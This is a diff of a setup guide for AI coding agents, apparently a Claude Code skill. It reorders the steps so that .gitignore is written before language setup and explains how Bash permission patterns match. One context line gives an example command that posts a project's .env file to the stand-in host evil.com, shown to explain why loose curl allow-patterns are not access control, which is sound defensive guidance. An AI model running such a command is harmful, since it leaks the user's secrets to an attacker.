@@ -147,17 +147,9 @@ To cover subdomains, note that `WebFetch(domain:*.example.com)` matches `api.exa
 
 The two `curl` patterns are deliberately loose, and this is a trade-off rather than a boundary. Claude Code matches `Bash(...)` against the whole command string, so `curl * api.example.com*` also allows a command that merely *mentions* the domain after another URL (`curl https://evil.com --data @.env api.example.com`). Tightening it to `Bash(curl -s https://api.example.com/*)` closes that hole but re-prompts whenever a flag is added or reordered — and per the [permissions docs](https://code.claude.com/docs/en/permissions), argument-constraining Bash patterns are fragile in both directions anyway (they miss `-X GET` before the URL, `https` vs `http`, `-L` redirects, and `$URL` variables). Since allowing `Bash` at all already lets Claude reach any URL via `curl`, treat these entries as prompt reduction for local development, not as network access control. If this project handles real secrets, enforce the boundary properly instead: deny `curl`/`wget` and route fetches through `WebFetch`, or validate URLs in a `PreToolUse` hook.
 
-### Step 6: Language setup
+### Step 6: .gitignore
 
-Follow the language reference from the table above — dependencies, linter, tests, unused-code detection, runtime pin, and its verification block. For a served web app or API, the reference also covers security headers, SEO, and the health endpoint.
-
-**Work through each reference top to bottom; its section order is load-bearing.** The TypeScript path in particular must write `.npmrc` before installing anything, because npm applies those settings only to installs that run after the file exists.
-
-### Step 7: CI & Dependabot
-
-Follow `references/supply-chain.md`.
-
-### Step 8: .gitignore
+Create `.gitignore` **before** the language setup below runs — its content is fully determined by the intake language, and the next step's verification depends on it. `references/typescript.md` sets Biome's `useIgnoreFile: true`, making `.gitignore` the single source of truth for what tooling skips; the Next.js verification then runs `npm run build` (which populates `.next/` in-tree) *before* it lints. A `.gitignore` written any later would arrive too late, `biome check` would exit 1 on that generated output, and the fix an agent reaches for — a `biome.json` exclude — quietly undoes the single-source design. Creating it here also pre-covers Go's build artifacts and Python's `.venv`. (Step 1's `git init` must already have run — Biome resolves the VCS root from `.git/`.)
 
 If `.gitignore` does not exist, create one. Every language gets:
 
@@ -170,15 +162,25 @@ tmp/
 
 Ignore `.env*` wholesale rather than only `.env*.local`. The Next.js reference scaffolds `.env.example` and tells the user to put real values in `.env`, so an ignore rule matching only `*.local` leaves the one file that actually holds secrets tracked — that is how a `.env` reaches a commit. The `!.env.example` negation keeps the committed template visible.
 
-Then add the language-specific entries:
+Then add the language-specific entries (from the reference you read for this language):
 
 - **TypeScript**: `node_modules/`, `dist/`, `*.tsbuildinfo`
 - **Next.js** (in addition to TypeScript): `.next/`, `out/`
 - **Go** and **Python**: see their references.
 
+### Step 7: Language setup
+
+Follow the language reference from the table above — dependencies, linter, tests, unused-code detection, runtime pin, and its verification block. For a served web app or API, the reference also covers security headers, SEO, and the health endpoint.
+
+**Work through each reference top to bottom; its section order is load-bearing.** The TypeScript path in particular must write `.npmrc` before installing anything, because npm applies those settings only to installs that run after the file exists.
+
+### Step 8: CI & Dependabot
+
+Follow `references/supply-chain.md`.
+
 ### Step 9: Summary
 
-Run `tree -a -I '.git' --dirsfirst` and show the user what was created. List any files that were skipped because they already existed, and any constraint recorded in CLAUDE.md during Step 6.
+Run `tree -a -I '.git' --dirsfirst` and show the user what was created. List any files that were skipped because they already existed, and any constraint recorded in CLAUDE.md during Step 7.
 
 ### Step 10: Initial commit
 
